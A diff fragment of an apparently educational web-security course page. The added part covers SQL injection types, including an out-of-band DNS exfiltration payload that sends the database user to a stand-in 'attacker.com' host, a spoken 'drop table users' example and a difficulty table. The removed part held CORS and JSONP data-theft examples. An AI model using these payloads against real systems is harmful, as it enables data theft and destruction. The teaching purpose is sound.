+                                                    <li>Alternative communication channels (DNS, HTTP)</li>
+                                                    <li>Useful when server responses are unstable</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example (DNS):</strong>
+                                                <code>' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\test.txt')))--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Voice-based SQLi -->
+                                    <div class="sqli-type-detailed voice-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-microphone"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Voice-based SQLi</h3>
+                                                <span class="difficulty-badge rare">Rare</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> SQL injection attack applied through voice commands in applications that provide database access via voice interfaces.</p>
+                                            <div class="key-points">
+                                                <h4>Target Applications:</h4>
+                                                <ul>
+                                                    <li>Voice-controlled database applications</li>
+                                                    <li>Smart assistants with database integration</li>
+                                                    <li>Voice-to-text input systems</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Spoken Example:</strong>
+                                                <code>"Search for user admin quote semicolon drop table users semicolon comment"</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
                                 </div>
 
-                                <div class="sop-bypass-grid">
-                                    <div class="bypass-method-card cors">
-                                        <div class="bypass-icon">
-                                            <i class="fas fa-exchange-alt"></i>
+                                <!-- Quick Reference Summary -->
+                                <div class="sqli-summary-table">
+                                    <h3>Quick Reference Summary</h3>
+                                    <div class="summary-grid">
+                                        <div class="summary-item">
+                                            <div class="summary-type">In-band</div>
+                                            <div class="summary-desc">Direct results visible</div>
+                                            <div class="summary-difficulty easy">Easy</div>
                                         </div>
-                                        <h4>CORS Misconfigurations</h4>
-                                        <p>Exploiting overly permissive Cross-Origin Resource Sharing policies</p>
-                                        <div class="bypass-example">
-                                            <code>
-# Vulnerable CORS header
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
-
-# Attack result: Full cross-origin access
-                                            </code>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Error-based</div>
+                                            <div class="summary-desc">Uses error messages</div>
+                                            <div class="summary-difficulty easy">Easy</div>
                                         </div>
-                                    </div>
-
-                                    <div class="bypass-method-card jsonp">
-                                        <div class="bypass-icon">
-                                            <i class="fas fa-file-code"></i>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Union-based</div>
+                                            <div class="summary-desc">Combines query results</div>
+                                            <div class="summary-difficulty medium">Medium</div>
                                         </div>
-                                        <h4>JSONP Vulnerabilities</h4>
-                                        <p>Exploiting JSONP endpoints to extract sensitive data</p>
-                                        <div class="bypass-example">
-                                            <code>
-# JSONP endpoint
-/api/user?callback=getData
-
-# Attack payload
-&lt;script src="/api/user?callback=stealData"&gt;&lt;/script&gt;
-                                            </code>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Boolean Blind</div>
+                                            <div class="summary-desc">True/false responses</div>
+                                            <div class="summary-difficulty hard">Hard</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Time-based</div>
+                                            <div class="summary-desc">Uses response delays</div>
+                                            <div class="summary-difficulty hard">Hard</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Out-of-band</div>
+                                            <div class="summary-desc">Different channels</div>
+                                            <div class="summary-difficulty expert">Expert</div>
                                         </div>
                                     </div>
                                 </div>
                             </div>
                         </section>
-
-                        <!-- Navigation Footer -->
-                        <div class="chapter-navigation">
-                            <button class="nav-btn prev-btn" onclick="showChapter('chapter18')">
-                                <i class="fas fa-chevron-left"></i>
-                                Previous Chapter
-                            </button>
-                            <button class="nav-btn next-btn" onclick="showChapter('chapter20')">
-                                Next Chapter
-                                <i class="fas fa-chevron-right"></i>
-                            </button>
-                        </div>
-                    </div>
-                </article>
 
                 <!-- Chapter 20: Single-Sign-On Security Issues -->
                 <article id="chapter20" class="chapter">
